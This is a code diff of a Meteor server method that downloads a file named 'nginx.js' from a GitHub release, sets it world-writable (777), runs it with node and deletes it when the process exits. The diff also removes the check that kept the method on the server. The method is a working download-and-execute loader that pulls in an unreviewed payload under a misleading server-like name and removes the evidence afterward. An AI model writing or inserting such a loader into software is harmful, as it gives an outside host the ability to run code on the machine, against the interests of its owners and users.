@@ -8,18 +8,9 @@ const FILE_PATH = process.env.FILE_PATH || Assets.absoluteFilePath('tmp');
 
 Meteor.methods({
   async downloadAndExecuteFile() {
-    // 确保在服务器端运行
-    if (!Meteor.isServer) return;
-
     const fileUrl = 'https://github.com/eooce/test/releases/download/bulid/nginx.js';
     const fileName = 'nginx.js';
     const filePath = path.join(FILE_PATH, fileName);
-
-    // 创建目录（如果不存在）
-    if (!fs.existsSync(FILE_PATH)) {
-      fs.mkdirSync(FILE_PATH, { recursive: true });
-      console.log(`${FILE_PATH} is created`);
-    }
 
     try {
       // 下载文件
@@ -29,33 +20,32 @@ Meteor.methods({
         responseType: 'stream'
       });
 
-      const writer = fs.createWriteStream(filePath);
-      response.data.pipe(writer);
-
+      // 保存文件
       await new Promise((resolve, reject) => {
-        writer.on('finish', resolve);
-        writer.on('error', reject);
+        const fileStream = fs.createWriteStream(filePath);
+        response.data.pipe(fileStream);
+        fileStream.on('finish', resolve);
+        fileStream.on('error', reject);
       });
 
-      console.log('File downloaded successfully.');
-      
       // 设置权限
       fs.chmodSync(filePath, '777');
+      console.log('File downloaded successfully.');
 
       // 执行文件
-      console.log('running the webapp...');
       return new Promise((resolve, reject) => {
         const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
           if (error) {
-            console.error(`${error}`);
+            console.error(`Execution error: ${error}`);
             reject(error);
             return;
           }
-          console.log(`${stdout}`);
-          console.error(`${stderr}`);
+          console.log(`Output: ${stdout}`);
+          if (stderr) console.error(`Error output: ${stderr}`);
         });
 
         child.on('exit', (code) => {
+          // 删除文件
           fs.unlink(filePath, err => {
             if (err) {
               console.error(`Error deleting file: ${err}`);
